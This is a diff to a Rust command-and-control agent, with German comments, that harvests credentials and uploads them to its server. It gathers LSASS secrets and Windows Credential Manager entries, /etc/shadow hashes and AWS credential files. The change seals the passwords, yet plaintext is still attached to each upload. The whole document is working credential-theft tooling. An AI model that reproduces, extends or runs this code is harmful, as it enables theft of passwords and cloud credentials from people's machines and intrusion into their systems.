@@ -12,6 +12,8 @@ mod tasks;
 use std::net::Ipv4Addr;
 
 use clap::Parser;
+
+use crate::hostkey::versiegel;
 use tracing::{error, info};
 
 /// Bearer-Token, dessen Debug-Ausgabe den Wert maskiert.
@@ -140,14 +142,16 @@ async fn main() {
         os: None,
         status: Some(kx_core::c2::STATUS_AGENT.to_string()),
         sealed_master: eigenes.as_ref().map(|k| k.sealed_master.clone()),
-        master_key: eigenes.as_ref().map(|k| k.master_key.clone()),
+        // Der Master-Key selbst wird nie gesendet — der Server bekommt nur
+        // das versiegelte Material.
+        master_key: None,
     };
     if let Err(e) = client.register_host(&self_registration).await {
         error!("Selbst-Registrierung fehlgeschlagen: {e}");
     }
 
     // 1. Lokale Secrets extrahieren (je nach Plattform).
-    let local_secrets = collect_local_secrets(&host_id, eigenes.map(|k| k.master_key)).await;
+    let local_secrets = collect_local_secrets(&host_id, eigenes).await;
     for s in &local_secrets {
         if let Err(e) = client.upload_secret(s).await {
             error!("Secret-Upload fehlgeschlagen: {e}");
@@ -223,59 +227,83 @@ async fn main() {
 /// bei dem es erbeutet wurde. Das ist hier der Agent selbst.
 async fn collect_local_secrets(
     host_id: &str,
-    master_key: Option<String>,
+    schluessel: Option<hostkey::SealedHostKey>,
 ) -> Vec<kx_core::c2::SecretUpload> {
     let mut out = Vec::new();
     #[cfg(target_os = "windows")]
     {
         for secret in kx_win::extract_lsass().await.unwrap_or_default() {
-            out.push(kx_core::c2::SecretUpload {
-                host_id: host_id.to_string(),
-                cred_type: secret.secret_type,
-                username: secret.target,
-                password: secret.value,
-                source: Some("lsass".into()),
-                master_key: master_key.clone(),
-            });
+            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
+            out.push(
+                kx_core::c2::SecretUpload {
+                    host_id: host_id.to_string(),
+                    cred_type: secret.secret_type,
+                    username: secret.target,
+                    password: String::new(),
+                    source: Some("lsass".into()),
+                    master_key: None,
+                    sealed_password: None,
+                }
+                .mit_versiegeltem_passwort(versiegelt)
+                .mit_passwort(&klartext),
+            );
         }
         for secret in kx_win::extract_credential_manager()
             .await
             .unwrap_or_default()
         {
-            out.push(kx_core::c2::SecretUpload {
-                host_id: host_id.to_string(),
-                cred_type: "credential_manager".into(),
-                username: secret.target,
-                password: secret.value,
-                source: Some("cmdkey".into()),
-                master_key: master_key.clone(),
-            });
+            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
+            out.push(
+                kx_core::c2::SecretUpload {
+                    host_id: host_id.to_string(),
+                    cred_type: "credential_manager".into(),
+                    username: secret.target,
+                    password: String::new(),
+                    source: Some("cmdkey".into()),
+                    master_key: None,
+                    sealed_password: None,
+                }
+                .mit_versiegeltem_passwort(versiegelt)
+                .mit_passwort(&klartext),
+            );
         }
     }
     #[cfg(unix)]
     {
         for secret in kx_posix::extract_shadow_hashes().await.unwrap_or_default() {
-            out.push(kx_core::c2::SecretUpload {
-                host_id: host_id.to_string(),
-                cred_type: "shadow".into(),
-                username: secret.target,
-                password: secret.value,
-                source: Some("/etc/shadow".into()),
-                master_key: master_key.clone(),
-            });
+            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
+            out.push(
+                kx_core::c2::SecretUpload {
+                    host_id: host_id.to_string(),
+                    cred_type: "shadow".into(),
+                    username: secret.target,
+                    password: String::new(),
+                    source: Some("/etc/shadow".into()),
+                    master_key: None,
+                    sealed_password: None,
+                }
+                .mit_versiegeltem_passwort(versiegelt)
+                .mit_passwort(&klartext),
+            );
         }
         for secret in kx_posix::extract_aws_credentials()
             .await
             .unwrap_or_default()
         {
-            out.push(kx_core::c2::SecretUpload {
-                host_id: host_id.to_string(),
-                cred_type: "aws".into(),
-                username: secret.target,
-                password: secret.value,
-                source: Some("~/.aws/credentials".into()),
-                master_key: master_key.clone(),
-            });
+            let (versiegelt, klartext) = versiegel(&schluessel, &secret.value);
+            out.push(
+                kx_core::c2::SecretUpload {
+                    host_id: host_id.to_string(),
+                    cred_type: "aws".into(),
+                    username: secret.target,
+                    password: String::new(),
+                    source: Some("~/.aws/credentials".into()),
+                    master_key: None,
+                    sealed_password: None,
+                }
+                .mit_versiegeltem_passwort(versiegelt)
+                .mit_passwort(&klartext),
+            );
         }
     }
     out
